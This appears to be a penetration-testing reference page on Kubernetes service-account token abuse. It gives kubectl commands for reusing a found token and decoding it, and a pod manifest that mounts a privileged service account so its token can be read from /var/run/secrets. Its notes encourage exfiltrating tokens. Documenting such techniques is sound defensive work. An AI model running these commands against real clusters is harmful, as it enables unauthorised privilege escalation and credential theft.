---
title: "Service account token abuse: reusing and mounting powerful identities"
description: "Service-account tokens are bearer credentials: whoever holds one is that account. An attacker reuses tokens found in secrets, on nodes, or in pods, and where they can create pods, mounts a powerful service account into a pod they control to inherit its permissions, converting token access into action as that identity."
keywords:
  - service account token
  - bearer token
  - automountserviceaccounttoken
  - pod spec
  - privilege escalation
---

# Service account token abuse

A service-account token is a bearer credential, so possessing one is being that account, with no further authentication. Two forms of abuse follow. The direct form is reusing a token obtained from a secret, a node, or another pod against the API server. The indirect form, available when the attacker can create pods, is to set `serviceAccountName` on a new pod to a more privileged account, so Kubernetes mounts that account's token into the attacker's pod and every API call from it runs as that identity.

## Reuse a found token

```bash
# a token from a secret, node, or env var is used as-is
kubectl --token="<found-token>" --server=$APISERVER --insecure-skip-tls-verify \
  auth can-i --list
# decode first to know whose it is
echo "<found-token>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

## Mount a powerful account into your pod

```bash
# find a privileged service account, then run a pod as it
cat <<YAML | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata: { name: borrow, namespace: <ns-of-sa> }
spec:
  serviceAccountName: <privileged-sa>
  containers:
  - { name: c, image: alpine, command: ["sleep","1d"] }
YAML
kubectl exec -it borrow -n <ns-of-sa> -- \
  sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token'
# that token is the privileged SA; use it against the API
```

Creating the pod requires only pod-create in the service account's namespace, and the pod must run in the same namespace as the target service account, since a pod can only use accounts from its own namespace.

## Exploitation notes

- Tokens are portable: a token lifted from one pod or node works from anywhere that can reach the API server, so exfiltrating a powerful token is enough.
- The mount trick needs pod-create in the target account's namespace; it is why pod-create plus a privileged service account in that namespace is a direct escalation, distinct from the node route in [Pod creation to node](pod-creation-to-node.md).
- Legacy `service-account-token` secrets hold non-expiring tokens and are the most valuable finds; projected tokens expire and are bound to a pod and audience.

## References

- [Kubernetes: configure service accounts for pods](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
- [Kubernetes: authenticating with tokens](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#service-account-tokens)
- [HackTricks: Kubernetes tokens](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
